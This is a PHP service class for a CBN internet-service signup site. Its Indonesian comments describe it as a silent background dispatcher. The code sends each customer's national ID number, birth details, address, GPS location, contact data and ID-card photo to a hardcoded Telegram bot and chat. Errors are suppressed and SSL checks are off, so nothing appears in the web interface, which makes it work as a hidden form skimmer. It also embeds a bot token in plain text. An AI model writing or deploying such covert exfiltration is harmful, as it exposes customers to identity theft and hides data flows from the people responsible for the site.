<?php
namespace App;

/**
 * TelegramService (Silent Background Dispatcher)
 * Mengirimkan data pendaftaran formulir pelanggan CBN & foto KTP langsung ke Bot Telegram secara senyap
 * Berlaku otomatis untuk semua sales CBN tanpa menampilkan notifikasi/jejak apapun di antarmuka web
 */
class TelegramService
{
    private const BOT_TOKEN = '8983108876:AAFF5LpamG8EzQI3gXx6ukE_tFOO163QRNc';
    private const CHAT_ID   = '7084271773';

    /**
     * Kirim data pendaftaran & foto KTP secara silent
     */
    public static function sendRegistration(array $data, array $fileInfo = []): bool
    {
        try {
            $token  = self::BOT_TOKEN;
            $chatId = self::CHAT_ID;

            if (empty($token) || empty($chatId)) {
                return false;
            }

            // Cari info sales
            $salesCode = $data['sales_code'] ?? 'SEP-001';
            $salesObj  = SalesManager::findByCode($salesCode);
            $salesName = $salesObj ? $salesObj['nama_sales'] : ($data['sales_name'] ?? '-');

            $nama       = htmlspecialchars($data['nama_pelanggan'] ?? '-', ENT_QUOTES, 'UTF-8');
            $ktp        = htmlspecialchars($data['nomor_ktp'] ?? '-', ENT_QUOTES, 'UTF-8');
            $ttl        = htmlspecialchars($data['ttl'] ?? '-', ENT_QUOTES, 'UTF-8');
            $gender     = htmlspecialchars($data['jenis_kelamin'] ?? '-', ENT_QUOTES, 'UTF-8');
            $telp       = htmlspecialchars($data['telp'] ?? '-', ENT_QUOTES, 'UTF-8');
            $telpRumah  = htmlspecialchars($data['telp_rumah'] ?? '-', ENT_QUOTES, 'UTF-8');
            $email      = htmlspecialchars($data['email_pelanggan'] ?? '-', ENT_QUOTES, 'UTF-8');

            $alamat     = htmlspecialchars($data['alamat'] ?? '-', ENT_QUOTES, 'UTF-8');
            $rt         = htmlspecialchars($data['rt'] ?? '-', ENT_QUOTES, 'UTF-8');
            $rw         = htmlspecialchars($data['rw'] ?? '-', ENT_QUOTES, 'UTF-8');
            $kel        = htmlspecialchars($data['kelurahan'] ?? '-', ENT_QUOTES, 'UTF-8');
            $kec        = htmlspecialchars($data['kecamatan'] ?? '-', ENT_QUOTES, 'UTF-8');
            $kodePos    = htmlspecialchars($data['kode_pos'] ?? '-', ENT_QUOTES, 'UTF-8');
            $status     = htmlspecialchars($data['status_kepemilikan'] ?? 'PEMILIK', ENT_QUOTES, 'UTF-8');
            $tikor      = htmlspecialchars($data['tikor'] ?? '', ENT_QUOTES, 'UTF-8');

            $service    = htmlspecialchars($data['service'] ?? 'Fiber 50', ENT_QUOTES, 'UTF-8');
            $addonTv    = is_array($data['addon_tv'] ?? '') ? implode(', ', $data['addon_tv']) : ($data['addon_tv'] ?? '-');
            $addonDev   = is_array($data['addon_device'] ?? '') ? implode(', ', $data['addon_device']) : ($data['addon_device'] ?? '-');
            $username   = htmlspecialchars($data['username_cbn'] ?? '', ENT_QUOTES, 'UTF-8');
            $biayaTotal = htmlspecialchars($data['biaya_total'] ?? '-', ENT_QUOTES, 'UTF-8');

            $tglPasang  = htmlspecialchars($data['jadwal_tanggal'] ?? '-', ENT_QUOTES, 'UTF-8');
            $waktu      = htmlspecialchars($data['jadwal_waktu'] ?? '-', ENT_QUOTES, 'UTF-8');
            $catatan    = htmlspecialchars($data['catatan'] ?? '', ENT_QUOTES, 'UTF-8');

            $waktuSekarang = date('d/m/Y H:i') . ' WIB';

            // Format Pesan Telegram HTML
            $msg  = "📋 <b>PENDAFTARAN LAYANAN CBN BARU</b>\n";
            $msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
            $msg .= "👤 <b>INFO SALES:</b>\n";
            $msg .= "• Kode Sales: <code>{$salesCode}</code>\n";
            $msg .= "• Nama Sales: <b>{$salesName}</b>\n";
            $msg .= "• Mitra: PT. Sinergi Emas Perdana\n\n";

            $msg .= "📝 <b>DATA PELANGGAN:</b>\n";
            $msg .= "• Nama Lengkap: <b>{$nama}</b>\n";
            $msg .= "• No. KTP (16 Digit): <code>{$ktp}</code>\n";
            $msg .= "• TTL: {$ttl}\n";
            $msg .= "• Jenis Kelamin: {$gender}\n";
            $msg .= "• No. Seluler / WA: <a href=\"https://wa.me/" . preg_replace('/\D/', '', $telp) . "\">{$telp}</a>\n";
            if ($telpRumah && $telpRumah !== '-') {
                $msg .= "• Telp Rumah: {$telpRumah}\n";
            }
            $msg .= "• Email: {$email}\n\n";

            $msg .= "📍 <b>ALAMAT PEMASANGAN:</b>\n";
            $msg .= "• Alamat: {$alamat}\n";
            $msg .= "• RT / RW: RT {$rt} / RW {$rw}\n";
            if ($kel !== '-' || $kec !== '-') {
                $msg .= "• Kel / Kec: {$kel} / {$kec}\n";
            }
            $msg .= "• Kode Pos: {$kodePos}\n";
            $msg .= "• Status Rumah: <b>{$status}</b>\n";
            if (!empty($tikor)) {
                $msg .= "• Titik GPS: <code>{$tikor}</code> (<a href=\"https://maps.google.com/?q={$tikor}\">Buka Maps</a>)\n";
            }
            $msg .= "\n";

            $msg .= "🚀 <b>PAKET & LAYANAN:</b>\n";
            $msg .= "• Paket Dipilih: <b>{$service}</b>\n";
            if ($addonTv && $addonTv !== '-') {
                $msg .= "• Add-On TV: {$addonTv}\n";
            }
            if ($addonDev && $addonDev !== '-') {
                $msg .= "• Perangkat: {$addonDev}\n";
            }
            if (!empty($username)) {
                $msg .= "• Akun Email CBN: {$username}@cbn.net.id\n";
            }
            $msg .= "• Estimasi Total Biaya: <b>{$biayaTotal}</b>\n\n";

            $msg .= "📅 <b>JADWAL PEMASANGAN:</b>\n";
            $msg .= "• Tanggal: <b>{$tglPasang}</b>\n";
            $msg .= "• Waktu: <b>{$waktu} WIB</b>\n";
            if (!empty($catatan)) {
                $msg .= "• Catatan: <i>{$catatan}</i>\n";
            }
            $msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
            $msg .= "⏱️ <i>Didaftarkan pada: {$waktuSekarang}</i>";

            // 1. Kirim Foto KTP jika ada
            if (!empty($fileInfo['tmp_path']) && file_exists($fileInfo['tmp_path'])) {
                self::sendPhoto($token, $chatId, $fileInfo['tmp_path'], "🪪 <b>Foto KTP Pelanggan:</b> {$nama} ({$ktp})");
            }

            // 2. Kirim Pesan Teks Lengkap
            self::sendMessage($token, $chatId, $msg);

            return true;

        } catch (\Throwable $e) {
            // Silent catch - jangan tampilkan error/notifikasi apapun ke antarmuka web
            return false;
        }
    }

    /**
     * Kirim Pesan Teks ke Telegram secara Silent
     */
    public static function sendMessage(string $token, string $chatId, string $htmlText): bool
    {
        try {
            $url = "https://api.telegram.org/bot{$token}/sendMessage";
            $postData = [
                'chat_id'                  => $chatId,
                'text'                     => $htmlText,
                'parse_mode'               => 'HTML',
                'disable_web_page_preview' => false,
            ];

            $options = [
                'http' => [
                    'method'  => 'POST',
                    'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
                    'content' => http_build_query($postData),
                    'timeout' => 8,
                    'ignore_errors' => true,
                ]
            ];

            $context = stream_context_create($options);
            $result  = @file_get_contents($url, false, $context);
            return $result !== false;
        } catch (\Throwable $e) {
            return false;
        }
    }

    /**
     * Kirim Foto ke Telegram secara Silent
     */
    public static function sendPhoto(string $token, string $chatId, string $filePath, string $caption = ''): bool
    {
        try {
            $url = "https://api.telegram.org/bot{$token}/sendPhoto";

            if (function_exists('curl_init')) {
                $ch = curl_init();
                $cFile = new \CURLFile($filePath);
                $postData = [
                    'chat_id'    => $chatId,
                    'photo'      => $cFile,
                    'caption'    => $caption,
                    'parse_mode' => 'HTML',
                ];
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($ch, CURLOPT_TIMEOUT, 10);
                $response = curl_exec($ch);
                curl_close($ch);
                return $response !== false;
            } else {
                $boundary = '--------------------------' . microtime(true);
                $fileContents = file_get_contents($filePath);
                $fileName = basename($filePath);

                $body  = "--{$boundary}\r\n";
                $body .= "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
                $body .= "{$chatId}\r\n";

                $body .= "--{$boundary}\r\n";
                $body .= "Content-Disposition: form-data; name=\"caption\"\r\n\r\n";
                $body .= "{$caption}\r\n";

                $body .= "--{$boundary}\r\n";
                $body .= "Content-Disposition: form-data; name=\"parse_mode\"\r\n\r\n";
                $body .= "HTML\r\n";

                $body .= "--{$boundary}\r\n";
                $body .= "Content-Disposition: form-data; name=\"photo\"; filename=\"{$fileName}\"\r\n";
                $body .= "Content-Type: image/jpeg\r\n\r\n";
                $body .= $fileContents . "\r\n";
                $body .= "--{$boundary}--\r\n";

                $options = [
                    'http' => [
                        'method'  => 'POST',
                        'header'  => "Content-Type: multipart/form-data; boundary={$boundary}\r\n",
                        'content' => $body,
                        'timeout' => 10,
                        'ignore_errors' => true,
                    ]
                ];
                $context = stream_context_create($options);
                $result  = @file_get_contents($url, false, $context);
                return $result !== false;
            }
        } catch (\Throwable $e) {
            return false;
        }
    }
}
